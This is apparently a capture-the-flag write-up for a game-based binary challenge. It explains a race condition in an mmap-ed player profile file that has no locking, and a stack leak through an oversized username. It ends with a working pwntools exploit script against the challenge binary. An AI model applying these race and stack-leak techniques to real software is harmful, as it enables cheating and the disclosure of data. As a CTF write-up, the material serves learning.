## Link Start !

This is a game-based challenge. Below are several key structures:

```c
struct character
{
    int level;
    int a; // Accumulated attack
    int hp;
    int b; // Next level (preset, but useless)
    char username[64];
    struct skill *skill_vtable;
};

struct character *gMonster, *gHero;

struct skill
{
    int attack_point;
    int defense_pooint;
    char *attack_type;
    char *defense_type;
    int c; // Additional value
};

struct skill *g_hero_kill_type[] = {
    &(struct skill){0x19, 0xc, "Starburst Stream", "Blade of Exercise", 8},
    &(struct skill){5, 1, "Sonic Assault", "Elven Sword", 0x20},
    &(struct skill){0, 0x46, "Diagonal slash", "Sword of Dusk", 0},
    &(struct skill){8, 0x37, "Horizontal Four-Way Slash", "Interpreter", 5},
    &(struct skill){0x64, 0xc8, "Starburst Stream", "...", 0x3e8}};

struct skill *g_monster_skill_type[] = {
    &(struct skill){0xa, 0xa, "Numbing Lmpact", "Golden Warhammer", 10},
    &(struct skill){0x1e, 0xf, "Water Inflow", "...", 15},
    &(struct skill){0x32, 0x14, "Lose Balance", "hidden g", 1},
    &(struct skill){0x50, 0x1e, "Sleeping songs", "voice", 10},
    &(struct skill){0x64, 0xc8, "Numbing Lmpact", "Golden Warhammer", 0x3e8}};

char *Monster_name[] = {"Lllfang The Kobold Lord", "Asterios The Taurus King", "Nerius The Evil Treant", "Fuscus the Vacant Colossus"};
```

The reverse engineering reveals that the `init_new_db_file` function saves new player skill profiles into a file located at `db_dir/{username}`. The `init_db` function then uses **`mmap`** to map this profile file directly into memory. Crucially, there is no file locking mechanism on this resource. This allows for a **Race Condition**: we can log into the same account multiple times simultaneously and modify the file contents to change player stats in real-time mid-game.

According to the `character` and `skill` structs, the hero's skills are balanced: they either have high attack/low defense or low attack/high defense. Furthermore, the monster's stats spike significantly after Level 3, making it impossible to defeat under normal circumstances.

By analyzing the `attack` function, we see that the base attack and defense values are assigned to local variables right before the prompt asking the player whether to use a "hidden method." This creates a **vulnerability window**:

1. **Process 1** triggers the attack and loads base stats for Skill A.
2. **Process 2** (logged into the same account) changes the skill profile in the file to Skill B.
3. **Process 1** continues, applying the "hidden method" bonuses based on the new skill profile, effectively "stacking" the high base stats of one skill with the high additives of another.

**Strategy:** I chose to initiate the attack with **Skill 3** (Base Atk: 8, Base Def: 0x37). During the input window, I used a second connection to call `change_skill` and switch to **Skill 1**. Upon returning to the first connection and selecting the hidden method, the resulting stats became **Attack: 0x28** and **Defense: 0x57**. Repeating this loop allows us to defeat the monster.

Finally, the `commemoration` function places the **flag** on the stack. By providing an oversized username, we can overwrite the null terminator, allowing `printf` to leak the flag string from the stack.

------

### EXP (Exploit Script)

Python

```python
from pwn import *
r=process('./code')
r2=process('./code')
context.log_level='debug'

def login(io):
    io.sendlineafter(b'login:',b'a')
    
def attack(io):
    io.sendlineafter(b'choice>> ',b'1')
    
def use_hide(io,choice):
    io.sendlineafter(b"(1:yes/0:no):", str(choice).encode())

def change_skill(io,choice):
    io.sendlineafter(b'choice>> ',b'3')
    io.sendlineafter(b'choice>> ',str(choice).encode())

def god_attack(io1,io2):
    # Process 1 selects high base stat skill
    change_skill(io1,3)
    attack(io1)
    # Process 2 switches the underlying mapped file to a different skill
    change_skill(io2,1)
    # Process 1 applies the 'hidden' bonus to the newly swapped stats
    use_hide(io1,1)

login(r)
login(r2)

while True:
    god_attack(r,r2)
    data=r.recvuntil(b'\n')
    if b"you win" in data:
        data=r.recvuntil(b'\n')
        if b"remember you forever!" in data:
            break

print("Hero defeated the monster. Proceeding to leak flag...")
r.recvuntil(b"name:")
# Send long payload to overwrite null terminator and leak stack data
r.send(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa')

r.interactive()
```